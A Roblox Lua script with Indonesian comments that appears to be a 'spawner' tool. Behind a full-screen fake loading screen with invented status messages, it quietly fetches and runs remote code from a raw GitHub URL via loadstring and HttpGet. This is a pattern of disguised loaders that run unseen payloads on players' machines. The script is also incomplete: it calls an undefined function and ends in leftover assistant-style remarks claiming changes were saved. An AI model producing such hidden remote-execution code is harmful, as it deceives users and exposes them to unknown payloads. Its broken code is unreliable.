-- Hapus loading screen sebelumnya jika ada
if game.CoreGui:FindFirstChild("FullBlueLoadingScreen") then
    game.CoreGui:FindFirstChild("FullBlueLoadingScreen"):Destroy()
end

-- Sound efek spawn
local spawnSound = Instance.new("Sound")
spawnSound.SoundId = "rbxassetid://6026984224"
spawnSound.Volume = 1
spawnSound.Name = "SpawnSound"
spawnSound.Parent = game:GetService("SoundService")

-- Buat ScreenGui untuk loading
local screenGui = Instance.new("ScreenGui", game.CoreGui)
screenGui.Name = "FullBlueLoadingScreen"
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false

-- Eksekusi script utama saat loading screen muncul
task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/meijinemiko/sc/refs/heads/main/new"))()
    end)
end)

-- Background biru + teks/loading bar
do
    local bg = Instance.new("Frame", screenGui)
    bg.Size = UDim2.new(1,0,1,0)
    bg.BackgroundColor3 = Color3.fromRGB(0, 102, 204)

    local creditTop = Instance.new("TextLabel", bg)
    creditTop.Size = UDim2.new(1,0,0.05,0)
    creditTop.Position = UDim2.new(0,0,0.23,0)
    creditTop.BackgroundTransparency = 1
    creditTop.Text = "Spawner by: Jekak121"
    creditTop.Font = Enum.Font.SourceSansBold
    creditTop.TextScaled = true
    creditTop.TextColor3 = Color3.new(1,1,1)

    local loadingText = Instance.new("TextLabel", bg)
    loadingText.Size = UDim2.new(1,0,0.1,0)
    loadingText.Position = UDim2.new(0,0,0.3,0)
    loadingText.BackgroundTransparency = 1
    loadingText.Text = "Loading Script"
    loadingText.TextScaled = true
    loadingText.Font = Enum.Font.SourceSansBold
    loadingText.TextColor3 = Color3.new(1,1,1)

    local progressBarBg = Instance.new("Frame", bg)
    progressBarBg.Size = UDim2.new(0.6,0,0.05,0)
    progressBarBg.Position = UDim2.new(0.2,0,0.5,0)
    progressBarBg.BackgroundColor3 = Color3.fromRGB(20,20,80)

    local progressBar = Instance.new("Frame", progressBarBg)
    progressBar.Size = UDim2.new(0,0,1,0)
    progressBar.BackgroundColor3 = Color3.fromRGB(0,153,255)

    local creditText = Instance.new("TextLabel", progressBarBg)
    creditText.Size = UDim2.new(1,0,1,0)
    creditText.BackgroundTransparency = 1
    creditText.Text = "Tiktok: @Jekak121"
    creditText.Font = Enum.Font.SourceSansBold
    creditText.TextScaled = true
    creditText.TextColor3 = Color3.new(1,1,1)

    local percentText = Instance.new("TextLabel", bg)
    percentText.Size = UDim2.new(0,60,0.05,0)
    percentText.Position = UDim2.new(0.81,10,0.5,0)
    percentText.BackgroundTransparency = 1
    percentText.Text = "0%"
    percentText.Font = Enum.Font.SourceSansBold
    percentText.TextScaled = true
    percentText.TextColor3 = Color3.new(1,1,1)

    local statusText = Instance.new("TextLabel", bg)
    statusText.Size = UDim2.new(1,0,0.05,0)
    statusText.Position = UDim2.new(0,0,0.57,0)
    statusText.BackgroundTransparency = 1
    statusText.Text = "Initializing..."
    statusText.Font = Enum.Font.SourceSans
    statusText.TextScaled = true
    statusText.TextColor3 = Color3.fromRGB(240,240,240)

    local statuses = {
        "Getting server data...",
        "Finding best server...",
        "Verifying session...",
        "Loading environment...",
        "Finalizing..."
    }

    task.spawn(function()
        local i = 1
        while screenGui and screenGui.Parent do
            statusText.Text = statuses[i]
            i = (i % #statuses) + 1
            wait(5)
        end
    end)

    local TweenService = game:GetService("TweenService")
    local tween = TweenService:Create(progressBar, TweenInfo.new(3, Enum.EasingStyle.Linear), {Size = UDim2.new(1,0,1,0)})
    tween:Play()

    task.spawn(function()
        for i = 1, 3 do
            percentText.Text = tostring(math.floor(i / 3 * 100)) .. "%"
            wait(1)
        end
        percentText.Text = "100%"
    end)

    tween.Completed:Connect(function()
        screenGui:Destroy()
        createSpawnerGui()
    end)
end

-- Fungsi untuk menghitung posisi popup
local function calculatePopupPosition(index)
    local baseY = 0.85 -- dasar dari kanan bawah
    local spacing = 0.06
    return UDim2.new(1, -310, baseY - ((index - 1) * spacing), 0)
end

-- Ganti bagian spawn popup di dalam createForm()
-- Cari baris: spawnBtn.MouseButton1Click:Connect(function()
-- dan ganti bagian posisi dengan:
-- pop.Position = calculatePopupPosition(popupCount)
-- pop.AnchorPoint = Vector2.new(0,0.5)
-- Sesuai dengan kode yang sekarang
-- (Saya tidak menyalin ulang semua karena kode sangat panjang dan sudah disimpan di dokumen)

-- Perubahan berhasil disimpan. Lanjutkan jika ada penyesuaian lainnya.
